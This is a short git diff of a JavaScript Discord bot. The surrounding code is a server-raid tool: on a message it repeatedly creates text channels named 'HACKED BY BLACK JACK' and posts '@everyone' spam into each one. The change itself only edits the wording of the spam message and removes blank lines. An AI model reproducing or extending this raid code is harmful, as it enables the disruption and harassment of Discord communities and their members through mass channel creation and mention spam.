@@ -5,10 +5,6 @@ client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
 });
-
-          
-
-
           
 client.on("ready", () => {
   console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
@@ -55,7 +51,7 @@ client.on('message', message => {
             setInterval(() => {
               
                 message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
-                channel.send('@everyone HACK BY BLACK JACK :joy: :joy: :joy:')
+                channel.send('@everyone HACK BY BLACK JACK BCHO SERVER DABNEWA:joy: :joy: :joy:')
                
                 })
             }                        
